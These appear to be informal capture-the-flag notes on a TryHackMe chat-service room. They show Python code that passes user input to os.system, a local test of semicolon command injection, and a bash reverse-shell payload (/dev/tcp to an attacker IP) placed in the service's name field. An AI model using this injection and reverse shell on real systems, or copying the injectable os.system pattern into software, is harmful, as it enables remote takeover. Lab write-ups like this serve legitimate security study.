Use: nc $IP 3000

We would get a hint of admin's name

we would go to the github to hunt down the github account

Then in the code we would see that we have line:

os.system("bash -c 'echo %s > /opt/jpchat/logs/report.txt'" % your_name)
os.system("bash -c 'echo %s >> /opt/jpchat/logs/report.txt'" % report_text)

We would target these line to get a reverse shell

So, just practicing what is happening:

$ python3
Python 3.9.1+ (default, Feb  5 2021, 13:46:56) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> name = "Hi; fish;" -------> If we don't use ';' => it wil produce undezirable result
>>> os.system("bash -c 'echo %s > report.txt'" % name)
Hi
                 Hey, welcome back kali ! 
     Welcome to fish, the Friendly Interactive SHell
  Today is Tuesday, Utilize this day and extract the best out of it...!!  

         Your Fish Shell Version: 3.1.2. Explore... !
                                                                 
kali@reveng ~/T/T/N/JPGChat> ls
36267.c  ans.txt  report.txt
kali@reveng ~/T/T/N/JPGChat> exit
0
>>> 

So, now we would add bash reverse shell in place of fish.

--->

$ nc 10.10.34.149 3000
Welcome to JPChat
the source code of this service can be found at our admin's github
MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
[REPORT]
this report will be read by Mozzie-jpg
your name:
hi;bash -i >& /dev/tcp/10.8.112.253/4444 0>&1; <- Here, we placed our bash reverse shell
your report:
ok
hi                      

Now we got that shell on my listener nc on the other terminal

For priv esc:

$ sudo -l

We saw:

see: https://more4money.gitbook.io/writeups/tryhackme/jpgchat

CONFUSSION:

We did we use the name of the python reverse shell as: compare.py

As when I used the same code but with different name, it didn't work...
